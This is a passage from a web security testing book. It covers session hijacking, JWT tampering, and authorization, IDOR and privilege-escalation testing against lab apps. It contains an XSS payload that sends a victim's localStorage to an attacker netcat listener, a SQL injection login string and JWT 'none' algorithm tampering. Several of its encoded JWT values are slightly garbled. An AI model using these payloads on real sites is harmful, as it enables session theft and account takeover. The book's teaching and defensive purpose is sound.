Next, we will check our IP address and set up a simple Netcat server to listen, as seen in [Chapter 4](#ch04.xhtml),  Observability with SQL Injections. The IP address on Linux can be checked with the command ifconfig. The simple netcat listener is started with the command nc -lvp 9393, which tells netcat to listen to port 9393. This is shown in the following figure:

![](images/Figure_10.17.png)

Figure 10.17: Starting a listening server on a Linux VM

So, using the information from ifconfig, the payload code is updated as follows:

<script>

var img = new Image();

store = "";

for (let i = 0; i < localStorage.length; i++) {

const key = localStorage.key(i);

const value = localStorage.getItem(key);

store += value + "\n";

}

img.src="http://192.168.196.128:9393?values=" + store;

</script>

Let us insert a post that uses this payload in the forum section. Browse to the write post and paste this in as a post after uploading an image. Unfortunately, habit-helper has a client-side protection mechanism that does not allow the script tag, as follows:

![](images/Figure_10.18.png)

Figure 10.18: Client-side protection

We will need to bypass it using Burp Suite’s proxy tool. Go to the Proxy tab and click the Intercept is off button to turn the proxy on. Then, change the <script> tag by a single character and click Add comment.

The proxy will intercept your request. Fix the one character change to the script tag, and click the Forward button as follows:

![](images/Figure_10.19.png)

Figure 10.19: Bypass client-side protection

Then click Intercept is on to turn the interception off.

The first time you bypass the client side on habit-helper, it will substitute a CTF flag for your script, as shown in the following figure:

![](images/Figure_10.20.png)

Figure 10.20: Client-side CTF flag

To demonstrate this exploitation we need to have someone login as a user who will trigger the malicious code. To test our exploitation, we can log in as Lizzie via an incognito browser and view this post to activate the cross-site scripting. Then, the attacker will receive the localStorage values as follows:

![](images/Figure_10.21.png)

Figure 10.21: Returning localStorage values

Hijacking occurs by changing my remember-me values to Lizzie’s, which we found above. Then, we will have access to Lizzie’s session. Use development tools to change these values in the Local Storage, as follows:

![](images/Figure_10.22.png)

Figure 10.22: Updating Local Storage values in Development tools

To modify these values:

1.  Go to Development tools by clicking on the three dots in the right-hand corner, selecting More tools from the menu, and then Development tools from the submenu.
2.  In development tools, go to the Application tab.
3.  On the left-hand side, select the URL you are testing to see the localStorage values.
4.  Double-click on a value to change it.
5.  Hit enter to save your new value.

A similar approach works for changing session cookies or tokens in sessionStorage. The only difference would be selecting that storage option in step 3.

[JSON Web Tokens](#contents.xhtml_sc2_166a)

JWT presents a compact, self-contained means of representing information between parties as JSON data. Functioning as tokens with a cryptographic signature, they provide a secure mechanism for transmitting claims between entities. Unlike encrypted data, JWTs are solely signed, enhancing data integrity without encryption. Their structure involves base64 encoding, making them concise and efficient for various applications.

While JWTs offer cryptographic assurance, it is crucial to recognize that they work within a standard framework and are not secure by default. Rather than a covert, ultra-secure solution, JWTs have gained prominence as a widely adopted industry standard. Their prevalence and ease of implementation have propelled JWTs into a common practice for conveying secure, verifiable information across different components of web applications.

JWTs serve as a straightforward and efficient method for transmitting information between parties. A JWT consists of three distinct parts: the header, the payload, and the signature. The header encompasses metadata about the token, such as the token type and the signing algorithm used. The payload holds the actual claims or assertions, supplying information about the user or the application context. The header and payload are encoded using Base64, ensuring efficient data transmission. The signature, the third part, is generated by applying a specified cryptographic algorithm to the encoded header, payload, using a secret key. This signature ensures the integrity of the JWT, allowing recipients to verify the token's validity. These components are seamlessly concatenated with periods, forming the JWT structure: header.payload.signature. The modular and standardized nature of JWTs makes them widely adopted for data interchange across various web applications and services.

[JWT creation and verification](#contents.xhtml_sc3_167a)

This section delves into the step-by-step procedures of crafting a JWT, including encoding the header and payload, signing the token, and the subsequent verification steps crucial for maintaining data integrity in server-side requests.

JWT creation is done as follows:

1.  Create the JSON header and encode it using Base64.
2.  Create the JSON payload and encode it using Base64.
3.  Concatenate the encoded header and payload with a period (.)
4.  Sign the concatenated result.
5.  Base64 encodes the signature.
6.  Append a period (.) and then the encoded signature.

JWT Verification uses the following steps:

1.  Split the token into three parts based on the dots.
2.  Base64 decodes each part.
3.  Parse the JSON to extract the header and payload.
4.  Retrieve the algorithm from the header.
5.  Verify the signature based on the algorithm.
6.  Verify the claims within the payload.

Although JWTs may contain PII, attackers often target the signature to tamper with and modify the JWT. Given the ease of Base64 encoding and decoding, ensuring the integrity of JWTs is crucial, particularly when dealing with sensitive data and making server-side requests.

[Example of JWTs](#contents.xhtml_sc3_168a)

Let us look at an example JWT and see the different parts. The following example was generated using an example application provided by the Open Worldwide Application Security Project (OWASP) that is called the OWASP Juice Shop Application:

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6ImRlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDE5LTExLTA3IDE2OjE4OjAyLjAyMCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE5LTExLTA3IDE2OjE4OjAyLjAyMCArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE1NzMxNDM1MjgsImV4cCI6MTU3MzE2MTUyOH0.j5z5VUxtNmsQ0Y6ozY7MpkFPIvXL4XygdO9Pw-UsnPNMxnKlMHmpsJnMFV-r2HmQAGn9O3uMqve3iNSEQcxBHBG4MGyR6yQoRbEJbKKZqTSzJXo1IGL1JGTC1cOjsglR6rP8JJyGMR5NQQnVaMVygRjTduhtkGIUoCNDibs9x6s

In this example, the header is eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9, which can be decoded from base64 to show its value {"alg":"RS256","typ":"JWT"}. The alg attribute is short for algorithm and tells us how the payload is signed. Many different algorithms are supported, including symmetric algorithms, asymmetric algorithms, and none, which indicates no signature will be used.

Similarly, the payload starts after the header and contains:

eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImxhc3RMb2dpbklwIjoiMC4wLjAuMCIsInByb2ZpbGVJbWFnZSI6ImRlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDE5LTExLTA3IDE2OjE4OjAyLjAyMCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE5LTExLTA3IDE2OjE4OjAyLjAyMCArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJpYXQiOjE1NzMxNDM1MjgsImV4cCI6MTU3MzE2MTUyOH0.

The payload can be decoded to extract the following information:

{"status":"success","data":{"id":1,"username":"","email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin","lastLoginIp":"0.0.0.0","profileImage":"default.svg","totpSecret":"","isActive":true,"createdAt":"2019-11-07 16:18:02.020 +00:00","updatedAt":"2019-11-07 16:18:02.020 +00:00","deletedAt":null},"iat":1573143528,"exp":157316152OH0}.

Consider the example: the header, initially encoded as:

'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9', can be decoded easily, the algorithm changed to 'none', and then re-encoded as 'eyJhbGciOhxub25lIiwidHlwIjoiSldUIn0K'. Then, anything in the payload could be changed without detection. This underscores the importance of diligent integrity checks with every server-side request to thwart potential decoding and modification attempts.

[Securing JSON Web Tokens](#contents.xhtml_sc3_169a)

Securing JWT is crucial for keeping the integrity and confidentiality of session management. Ensure robust security with the following best practices:

*   Verify signatures diligently: Many libraries offer decode and verify functions. Always use the verify method, which actively checks the signature's validity.
*   Utilize strong secrets: The strength of the signature relies on the secret used. Avoid using weak secrets, as tools like Hashcat can crack JWTs offline if the secret is not robust.
*   Limit algorithms: Restrict JWTs to a single algorithm to simplify validation. Avoid allowing the 'none' algorithm, as it opens the door to potential attacks.
*   Algorithm allowlisting: If multiple algorithms are necessary, implement an allowlist and avoid mixing symmetric and asymmetric algorithms to prevent Algorithm Confusion.
*   Consider encryption: Encrypt the JWT contents if they are only used server-side. Avoid encryption if the contents are processed client-side, as the decryption key may become exposed.
*   Verify standard claims: Confirm standard claims like 'iss' (issuer), 'aud' (audience), 'exp' (expiration time), and 'nbf' (not before time) to ensure the JWT's legitimacy.
*   Keep libraries updated: Regularly update your JWT library to patch vulnerabilities and benefit from the latest security features.
*   Avoid DIY implementations: Resist the temptation to create custom JWT implementations. Rely on established and well-maintained libraries to mitigate risks associated with homegrown solutions.

[Conclusion](#contents.xhtml_sc2_170a)

Navigating the tangle of session management vulnerabilities requires a nuanced understanding and proactive defense. As we conclude this chapter, you have acquainted yourself with the fundamentals and mastered the art of testing and safeguarding against guessable session IDs, session fixation, session hijacking, and the nuances of JWT vulnerabilities. The insights gained, and the secure coding guidelines are robust protection against potential breaches.

In the following chapter, we will address missing functional access control by utilizing Burp Suite's Site Map Tool. We will also explore the complexities of IDOR and privilege escalation while exploring CSRF to better identify and mitigate potential threats.

Join our book’s Discord space

Join the book's Discord Workspace for Latest updates, Offers, Tech happenings around the world, New Release and Sessions with the Authors:

**[https://discord.bpbonline.com](https://discord.bpbonline.com)**

![](images/fm1.png)

# [CHAPTER 11Authorization Practices](#contents.xhtml_ch11a)

[Introduction](#contents.xhtml_sc2_171a)

The complexity of authorization in web applications requires a deep understanding of potential vulnerabilities and proficient testing methods. This chapter explores standard authorization testing, unraveling the nuances of missing function level access control, Insecure Direct Object Reference (IDOR), privilege escalation, Cross-Site Request Forgery (CSRF), and Server-Side Request Forgery (SSRF). Equipped with step-by-step testing examples and comprehensive, secure code guidelines, this chapter provides you with the knowledge to secure your applications against well-known authorization attack vectors.

[Structure](#contents.xhtml_sc2_172a)

This chapter will discuss the standard authorization testing and vulnerabilities, including:

*   Authorization basics
*   Missing function level access control
*   Insecure Direct Object Reference
*   Privilege escalation
*   Cross-Site Request Forgery
*   Server-Side Request Forgery

There will be step-by-step testing examples for each vulnerability type and secure code guidelines.

[Objectives](#contents.xhtml_sc2_173a)

By the end of this chapter, you will be familiar with well-known authorization attack vectors. You will learn to use Burp Suite’s Site Map Tool and the Autorize extension to test for missing function level access control. We will examine IDORs, looking at manual testing and automating exploitation. We will also look at privilege escalation exploits, where a valid user determines how to change their privileges vertically or horizontally. We will discuss server-side request forgery and how to recognize it. Finally, we will learn cross-site request forgery, including multiple examples of missing security controls and poorly implemented security controls. Secure coding guidelines will follow for each vulnerability type.

[Authorization basics](#contents.xhtml_sc2_174a)

Authorization establishes the permissions and privileges granted to authenticated users, controlling their access to specific resources, functionalities, or data within an application or system. It ensures that users only interact with information and perform actions aligned with their assigned roles or permissions. Authorization vulnerabilities can take several forms, with varying testing methodologies and secure coding guidance. For example, missing function-level access control testing can be reasonably automated with the right tools. Still, IDOR requires manual testing and attention to detail from the tester. In the next section, we will look at the different testing techniques.

[Authorization basic testing](#contents.xhtml_sc3_175a)

Authorization testing is fundamental to securing applications by addressing critical questions that uncover potential vulnerabilities. This assessment involves exploring whether post-authentication data or functionality is inadvertently exposed to unauthenticated users and whether unauthorized users can manually invoke requests for privileged functionality or access confidential data while logged in. It also evaluates the risk of users accessing data belonging to others, which they should not be able to access, which is known as Insecure Direct Object Reference (IDOR). Additionally, the testing assesses whether users can learn their privilege level within requests and, if found, change it, which is referred to as privilege escalation. For higher security applications, we also consider whether the application mandates re-authentication to safeguard the manipulation of sensitive information. Through this comprehensive analysis, authorization testing aims to reinforce applications against potential security loopholes and unauthorized access.

In basic authorization testing, a careful examination involves various strategic steps to uncover potential vulnerabilities. It is necessary to test all viewable pages accessible when logged in but not when logged out. By manually trying to view these pages without authentication and as different users with different privileges, one can find any accidental exposure of unauthorized content. Additionally, the analysis extends to actions or functionalities accessible only when logged in. These should be tested even when the page initiating the action correctly limits access. The application may still allow the action to be performed.

In the following subsection, we will use two tools to automate testing pages and functionalities in applications that use session cookies. These are the Site Map Tool and the Autorize Extension. Careful manual testing and using tools such as Burp Suite Repeater will be necessary for applications that do not use session cookies. Another crucial part of authorization testing is the searching for insecure direct object references (IDOR), where modifying elements like the URL, GET and POST parameters, cookie values, local/session storage, and HTTP headers may reveal critical insights. Similarly, we will try altering elements that appear to specify the privilege level. Testing examples for IDOR and privilege escalation will be detailed in later subsections.

Understanding what a direct object reference or an indicator of privilege level could be is essential in this testing phase. The evaluation encompasses elements within the URL, GET parameters, POST parameters, cookie values, local/session storage, and HTTP headers. Modification of these elements can shed light on potential vulnerabilities, allowing security professionals to learn the robustness of the application's authorization mechanisms. Whether manually changed or manipulated through tools like Burp Interceptor or Repeater, these assessments significantly strengthen applications against unauthorized access and potential exploitation.

The following table shows what modification methods should be tried for each location that can show privilege or a direct object reference:

| Location | Modification methods |
| Part of the URL | Change manually or modify using Burp Suite interceptor/repeater. |
| Get Parameter | Change manually or modify using Burp Suite interceptor/repeater. |
| Post Parameter | Modify using Burp Suite interceptor/repeater. |
| Cookie Value | Change the Set-Cookie from Burp Suite interceptor or use developer tools. |
| localStorage or sessionStorage | Change in developer tools. |
| HTTP Headers | Modify using Burp Suite interceptor/repeater. |

Table 11.1: Modification methods to try in manual authorization testing

[Missing function level access control](#contents.xhtml_sc2_176a)

Missing function level access control refers to a security vulnerability where a web application allows unprivileged users to access functionality or data intended for users with different privileges, often due to inadequate or absent authorization checks. This often arises from errors in implementing access control mechanisms. Merely controlling the presentation layer, such as displaying only authorized links and menu choices, is insufficient, as attackers can easily forge direct access to supposedly unauthorized pages. The impact of this vulnerability is significant, allowing attackers to invoke functions and services they are not authorized for, gain unauthorized access to other users' accounts and data, and perform privileged actions that should be restricted to specific roles or individuals. This oversight leads to unauthorized access to sensitive features and exposes the application to potential misuse that can cause data breaches.

[Site Map tool](#contents.xhtml_sc3_177a)

Burp Suite’s Site Map tool can automate testing for missing function-level access control. This is not its intended purpose, but it is a fantastic way to use this feature. This requires a little setup but is done without installing extensions, which may be preferred in specific engagements, especially red-team assessments. Below is a step-by-step walk-through of how to perform this test using the amazing-myths-2 application:

1.  Verify that Burp Suite is on, the traffic is going through the proxy, and the intercept is off.
2.  Set up a sitemap (i.e., target) tool to use a cookie jar. Go to the Project options tab and select the Sessions subtab. Select the rule Use cookies from Burp’s cookie jar and click the edit button. Refer to the following figure:

    ![](images/Figure_11.1.png)

    Figure 11.1: Burp's cookie jar tool configuration

    When the rule editor pop appears, navigate to the scope tab and select the target option. Click the Okay button at the bottom of the page, as follows:

    ![](images/1.png)

    Figure 11.2: Cookie jar rule editing

3.  Log in as the most powerful user, such as Admin or root. In this case, we will log in as JuliaHull, the site admin we discovered earlier. Remember, you can log in as Julia using the SQL Injection from [Chapter 9](#ch09.xhtml), Authentication Protocols. Username is JuliaHull’ or 1=1 --.
4.  Go through all the protected functionality, letting Burp Suite create a history site map. In this case, as an example, we will go through a few administrative functionalities found under the Manage tab.
5.  When done, log out of the app and clear cookies, if necessary. Logging in is a different type of user now, or decide to test what a non-logged-in user can do.
6.  Go to the target tab and set up the scope. Add the URL to the scope by right-clicking and selecting Add to the scope.

    Then, select any URLs that should not be included, right-click on them, and select Remove from scope. Registration, login, and logout should be excluded. Go to the scope tab and verify that everything looks correct. Refer to the following figure:

    ![](images/Figure_11.3.png)

    Figure 11.3: Scope tab

7.  Right-click on the site and select compare site map, as follows:

    ![](images/Figure_11.4.png)

    Figure 11.4: Compare site maps

8.  For Site Map 1, select Use current and click the Next button. Refer to the following figure:

    ![](images/Figure_11.5.png)

    Figure 11.5: Setting up Compare site maps

    Then, on the next page, select Use in-scope items only, as shown:

    ![](images/Figure_11.6.png)

    Figure 11.6: Site Map: Set use in-scope items only

9.  For Site Map 2, request map 1 in a different context, as shown in the following figure:

    ![](images/Figure_11.7.png)

    Figure 11.7: Site Map 2 set up

10.  Compare the results. The results will be shown in a separate window. Look at each URL request and response for each session. Burp Suite color-codes the responses to make this easier. Burp Suite uses orange when the requests are different, and the requests are dark when they are the same. Let us look at an example: the URL hidden that Julia can view is rendered but shown as a blank to our test account. This should be a 403 forbidden, so even though there is nothing to exploit, it makes us look closer to find possible oversites. Refer to the following figure:

    ![](images/Figure_11.8.png)

    Figure 11.8: Site Map Comparison

Looking at the comparison, it is interesting that the edit page was again not displayed to our non-privileged user, but the POST request is not Orange and appears to have an identical response. This indicated a need to test the actions more thoroughly to see if the actions can be done, even if the pages cannot be viewed properly.

The easiest way to test this is to right-click on the request in site map 2, and from the sub-menu, select to send the request to the repeater. Then, in the Repeater tool, update the information that was being edited, as shown in the following figure, so you can recognize if it has changed:

![](images/Figure_11.9.png)

Figure 11.9: Manually verify a suspicious site tool result

Now, checking the result shows that the edit functionality is missing proper access control. Refer to the following figure:

![](images/Figure_11.10.png)

Figure 11.10: Verifying missing access control

In the next section, we will run through the same testing with a different tool, the Autorize extension.

[Autorize extension](#contents.xhtml_sc3_178a)

The Autorize extension for Burp Suite is a valuable tool designed to streamline the detection of authorization vulnerabilities during penetration testing. Authorization testing is often one of the most time-consuming aspects of a penetration tester's work, and Autorize aims to simplify this process. The extension uses a low-privileged or non-logged-in cookie, allowing the penetration tester to navigate the website with a high-privileged user. It automatically repeats every request with the session of the low-privileged user and efficiently finds authorization vulnerabilities without requiring manual configuration. The extension reports enforcement statuses, color-coded for clarity: "Bypassed!" (In red), "Enforced!" (In green), and "Is enforced???" (In yellow, prompting configuration of the enforcement detector if needed). This automated approach saves time for the penetration tester and enhances the effectiveness of authorization testing.

The Autorize extension can be downloaded from the BApp Store. Using the BappStore to download extension was shown previously in [Chapter 5](#ch05.xhtml), Misconfiguration with Default Values, and step-by-step details are available there. From the Extender Tab of Burp Suite, select the subtab BApp Store. Sort the extension list by popularity, and Autorize will be shown near the top of the list. Select the Autorize extension, and then scroll down to the right side of the screen and click the install button. Refer to the following figure:

![](images/Figure_11.11.png)

Figure 11.11: Autorize Extension in BApp Store

Let us walk through an example of how to use the Autorize extension with the amazing-myths-2 application:

1. Go to the Autorize tab.

2. In the configuration area, paste your low-privileged cookies in the textbox under temporary headers. These can be found in a request from our last example.

3. Select the Check unauthenticated responses.

4. Click the Autorize off button to turn Autorize on. Refer to the following figure:

![](images/Figure_11.12.png)

Figure 11.12: Turn Autorize Extension On

5. You can further limit it by selecting an option from the interception filters. In this case, we only choose in-scope items.

6. Log in as JuliaHull and browse. If Autorize was on earlier, you can click the Clear List button to make this easier to sort through.

7. Check the results. The Autorize tool tagged the two actions as bypasses and is unsure about the other pages, which do not return 403 but have different content. We can click the Request/Response Viewers to see the requests and responses for any particular request. Refer to the following figure:

![](images/Figure_11.13.png)

Figure 11.13: Autorize results

The extension does say the two actions are bypasses, and they certainly look like bypasses, but as stated in the site map subsection, for actions, we need to verify the action occurred. If these were sensitive pages, this would be enough. The penetration tester would still need to perform manual validation using a repeater or something similar for actions.

[Fixing missing function level access control](#contents.xhtml_sc3_179a)

Addressing missing function level access control is crucial for maintaining the security of an application. To fix this vulnerability, it is essential to restrict access to authenticated users, especially for non-public pages or functions. Implementing user and role-based permissions is another key measure to enforce proper access controls. The risk of unauthorized access is significantly reduced by clearly defining which users or roles are authorized to access specific functionalities. Additionally, disallowing requests to unauthorized page types helps fortify the application against potential exploits related to access control. Combining these measures establishes a robust defense against missing function level access control, ensuring that only authorized users can access designated functionalities within the application.

[Insecure Direct Object Reference](#contents.xhtml_sc2_180a)

IDOR is a vulnerability when an application supplies improper access to sensitive or restricted resources. It allows an attacker to manipulate references to objects and access unauthorized data, such as files or database entries, by exploiting the lack of proper authorization checks. The most common use case is when a direct object reference is in a get URL parameter, such as the URL [http://FakeBankApp/myaccount?account=123](http://FakeBankApp/myaccount?account=123). Then, an attacker could change the account parameter from 123 to 124, view another person’s account, and gain access to that person’s account.

The IDOR is more complex to find. The four examples covered below will vary in difficulty. IDOR always requires recognizing that a direct object reference is being used, and that is why IDORs are rarely found by any automated tool or scan. They require manual testing.

[IDOR testing procedures walkthrough with examples](#contents.xhtml_sc3_181a)

As we walk through these examples, please keep in mind that an IDOR can occur in any of the locations listed in [Table 11.1](#ch11.xhtml_tab11-1). Our first example will be in the amazing-myths-3 application, and then we will look at the same IDOR with two slightly different and more challenging implementations in amazing-myths-2 and amazing-myth-3. Then, we will look at using Burp Intruder with an IDOR to enumerate available data in the habit-helper application.

[IDOR example one](#contents.xhtml_sc4_182a)

In the first three examples, we aim to read Julia Hull’s secret journal/private notes. First, log in with a previously created account or create a new account now in this application.

After logging in, create a secret journal entry and view it using the menu options as follows:

![](images/Figure_11.14.png)

Figure 11.14: Create and View Secret Journal

Upon viewing our user’s private notes created in the previous step, we see the following:

![](images/Figure_11.15.png)

Figure 11.15: Viewing private notes

The URL has a get parameter author with a value that is our current username. Assuming this is the simplest case of IDOR, we switch this value to JuliaHull and see what happens. As shown below, we can now view Julia’s secret journal:

![](images/Figure_11.16.png)

Figure 11.16: Viewing Julia's Secret Journal in amazing-myths-3

[IDOR example two](#contents.xhtml_sc4_183a)

In this example, we will use the amazing-myths-2 applications. Let us start the same way by creating a new user and logging in. Then, create a secret journal entry and view it.

As shown below, a first look is identical to the first example:

![](images/Figure_11.17.png)

Figure 11.17: Viewing Secret Journal in amazing-myths-2

When we try the same exploit, changing the get parameter, we cannot view Julia’s secret journal. Refer to the following figure:

![](images/Figure_11.18.png)

Figure 11.18: First test attempt fails

Let us remember [Table 11.1](#ch11.xhtml_tab11-1) and look for another possible direct object reference. First, open developer tools to look at the Application tab's localStorage, sessionStorage, and Cookie values. The localStorage and sessionStorage do not have any apparent direct object references, but there is a username cookie with the Catherine value as follows:

![](images/Figure_11.19.png)

Figure 11.19: Application storage for amazing-myths-2

Let us try changing this value to see if this is the direct object used, which works. We now have access to Julia’s secret journal. Refer to the following figure:

![](images/Figure_11.20.png)

Figure 11.20: Viewing Julia's secret journal in amazing-myths-2

[IDOR example three](#contents.xhtml_sc4_184a)

Now, let us look at amazing-myths-1. We will follow the same first steps. If necessary create a new user, log in, create a secret journal entry and view it. Refer to the following figure:

![](images/Figure_11.21.png)

Figure 11.21: Viewing secret journal in amazing-myths-3

The first page is identical to the structure of our first two examples. As in example two, a simple change of the get parameters fails to give us access to Julia’s journal. Refer to the following figure:

![](images/Figure_11.22.png)

Figure 11.22: First test attempt fails in amazing-myths-1

As in the second example, let us open developer tools to check other spots for a direct object reference. As in the earlier example, neither localStorage nor sessionStorage have any likely items. The cookies still have a username cookie, but the value is not, at first glance, recognizable, as follows:

![](images/Figure_11.23.png)

Figure 11.23: Viewing cookies in amazing-myths-1

Looking at the username value, notice that it ends with the symbol (=). This is generally a giveaway that the value is base64 encoded. The double = symbol makes it more likely. These values can be encrypted and then encoded, and not all base64 encoded values end in a single or double = symbol. It does not hurt to decode the value and check it. Let us copy the value and paste it into Burp’s Decoder tab, and then use the drop-down on the right-hand side to select Base64\. As we can see in the following figure, this is our username Base64 encoded:

![](images/Figure_11.24.png)

Figure 11.24: Using Burp Decoder to Base64 decode the username

Let us Base64 encode Julia’s username and change the cookie value. Refer to the following figure:

![](images/Figure_11.25.png)

Figure 11.25: Base64 encoding the new value

We get the following after substituting the new cookie value and refreshing the page:

![](images/Figure_11.26.png)

Figure 11.26: Julia's secret journal in amazing-myths-3

As you can see, each of these is still insecure direct object reference with slight variations or twists. Do not forget that your IDOR location can be GET parameter, POST parameter, Cookie, localStorage, sessionStorage, or HTTP header value. Also, remember that encoding is reversible and provides no security.

[Enumerating an IDOR with Burp Intruder](#contents.xhtml_sc4_185a)

The following example in the habit-helper application will look at a typical case with IDORs. Often, the IDOR is a customer number, order number, policy number, shipping number, or account number. Usually, the IDOR is represented by a number. The effect can be more extreme in these cases because you can use a tool to enumerate all numbers and get the returning documents or information.

In the habit-helper application, please create an account and log in. If you have not already used the resist feature, click the button to resist your bad habit. Refer to the following figure:

![](images/Figure_11.27.png)

Figure 11.27: Habit helper resist button

After clicking the button, a random image appears. Click the button several times to see one of four images with a different shape. Right-click on one of the images and select Open Image in the new tab, as follows:

![](images/Figure_11.28.png)

Figure 11.28: Right-click menu for images

Then, notice the URL in the new tab is similar to [http://127.0.0.1:8081/habit-helper-1.0/resources/core/images/basic-images/4.jpg](http://127.0.0.1:8081/habit-helper-1.0/resources/core/images/basic-images/4.jpg). Each image is named as number.jpg. Let us verify if there are any other hidden resources. These images are a direct object reference, and using the guessable number pattern makes these exploitable if any images following this pattern are not meant to be public.

Let us use Burp Suite to get the first 15 images. First, Burp Suite will not intercept jpg without modifying the default rules. Go to the Proxy tab and the Options subtab. Then, scroll down to the intercepted client requests section. Select the first rule on file extensions and click the edit button. When the Edit rule pop-up appears, remove the text ^jpg$| and click OK, as follows:

![](images/Figure_11.29.png)

Figure 11.29: Update Burp Suite to intercept images

Turn intercept on via the Intercept subtab, as shown in previous chapters.

Refresh the request for your image. When intercepted, right-click on the request and select Send to Intruder from the menu that pops up. Refer to the following figure:

![](images/Figure_11.30.png)

Figure 11.30: Send Intercepted Request to Intruder

Then, go to the Intruder tab. Click the Clear button. Then, highlight the number in the URL. In our example, this is 4\. Click the Add button as follows:

![](images/Figure_11.31.jpg)

Figure 11.31: Setting up Intruder Positions for enumeration

Then go to the Payloads subtab of Intruder. Then, select Numbers from the Payloads type drop-down. Set the number range to be from 1 to 15 with a step of 1, as follows:

![](images/Figure_11.32.png)

Figure 11.32: Setting up Intruder Payloads for enumeration

Now, click the Start attack button. A new window appears with the attack results. If we look at the responses and render the images, we find a hidden flag for the CTF game in the habit-helper application. Refer to the following figure:

![](images/Figure_11.33.png)

Figure 11.33: Intruder results

[Secure coding guidance for IDOR](#contents.xhtml_sc3_186a)

IDORs pose a significant threat by allowing unauthorized access to sensitive information. Implementing robust countermeasures is crucial to safeguarding your application against such risks. In this subsection, we will explore practical strategies to fix IDORs, protect your system, and preserve the confidentiality of user data:

1. Remove the direct object reference: If possible, cut out direct references to sensitive objects. This is generally done via redesigning this part of the application, and it is a better choice when these are caught before the application is released to production.

2. Store it in the session: Instead of relying on direct references, consider storing object identifiers securely in user sessions. This ensures that access to sensitive objects is tied to authenticated sessions, requiring proper authentication and authorization for retrieval.

3. Replace with a mapping: Introduce a mapping layer between user input and object references. Assign unique identifiers or tokens to objects and use a mapping mechanism to associate these identifiers with the actual objects. This way, even if an attacker gains access to an identifier, they cannot easily correlate it with sensitive data. This could be done with OWASP ESAPI. Since ESAPI is no longer supported, it may not be the best choice for some organizations. The following code example shows how to use ESAPI to create a mapping:

Import org.owasp.esapi.AccessReferenceMap;

Import org.owasp.esapi.reference.RandomAccessReferenceMap;

// Initialize and set up mapping

String basicObjects[] = {“file1.txt", “file2.txt", “file3.txt"};

Set directObjectSet = new HashSet(Arrays.asList(basicObjects));

directObjectSet.add(request.getRemoteUser());

AccessReferenceMap directObjectMap = new RandomAccessReferenceMap( directObjectSet );

// Access the indirect reference via direct reference

fileIndirectObj = directObjectMap.getIndirectReference(“file1.txt");

// Get the direct reference from Indiect

String file =(String)directObjectMap.getDirectReference( actionIndirectObj );

4. Check the integrity: Implement integrity checks to verify the legitimacy of requests. This can be done in one of two ways.

• Ensure the user making the request has the necessary permissions to access the requested resource. Regularly audit and update access controls to reflect user roles and privileges changes.

• Another simple way to do an integrity check is to use base64(direct object reference)\HMAC(base64(direct object reference)) instead of the direct object reference itself. An HMAC is a keyed-hash message authentication code. This will only work if you verify the HMAC every time this data is accessed. Also, follow best practices for the cryptographic key used in the HMAC. This technique works regardless of where the data is stored: Get parameter, Cookie, localStorage, sessionStorage, Post Parameter, HTTP Header, etc

5. Encrypt the direct object reference: Employ encryption techniques to protect sensitive data in transit and at rest. Encrypting direct object references and associated information adds an extra layer of security, making it more challenging for attackers to decipher and misuse the data they manage to access. Encryption makes it impossible for the attacker to change the parameter to another value that decrypts unless they know the encryption key or a weak/broken encryption algorithm is used. Some rules to follow when using encryption are:

*   Always use recommended algorithms for hashing and encryption.
*   Do not use guessable keys.
*   Use an encryption key generated with a cryptographically secure random number generator or computed using an algorithm like PBKDF2.
*   Build the code with the idea that the key and algorithm may have to change due to compromise, key rotation schedules, or new zero days in given algorithms.

By applying these measures, you can significantly enhance the security posture of your application and defend against the potential risks posed by IDORs.

[Privilege escalation](#contents.xhtml_sc2_187a)

Privilege escalation is a security issue where attackers gain unauthorized access to higher-level permissions or privileges within a system or application. This can involve elevating access rights from a lower-privileged user to a higher-privileged user, allowing the attacker to perform actions or access resources beyond their intended scope.

Privilege escalation in web applications is a matter of finding, deducing, or guessing how privilege is set or checked and being able to modify that. We have already seen one example in [Chapter 9](#ch09.xhtml), Authentication Protocols, when we looked at Mass Assignment Vulnerabilities and how the ability to guess the admin flag allowed us to create an admin user at registration. Similarly, at registration, we could use SQL Injection to gain admin.

Returning to [Chapter 10](#ch10.xhtml), Session Management, the JSON Web Token (JWT) we decoded had a role stored in it. This JWT was already from an admin, but it would be easy to change the role and algorithm value to none and gain admin privileges that way.

Another way to gain admin access would be to use a Cross-Site Request Forgery (CSRF) to grant yourself admin access, which we will look at in the next section. Privilege escalation is not a single technique. It could be any technique covered in this book; it is just how it is applied.

[Example of privilege escalation](#contents.xhtml_sc3_188a)

This example has the privilege stored in a cookie, similar to the IDOR examples in the last subsection. This is an exercise for you to do on your own, and after completing it, come back and check the answer. Look at the habit-helper application while logged out. Look for any cookies that may indicate privilege. Try to upgrade your privilege level to an administrative level. Your starting point is as follows:

![](images/Figure_11.34.png)

Figure 11.34: Roles stored in cookies

[Walkthrough for privilege escalation exercise](#contents.xhtml_sc4_189a)

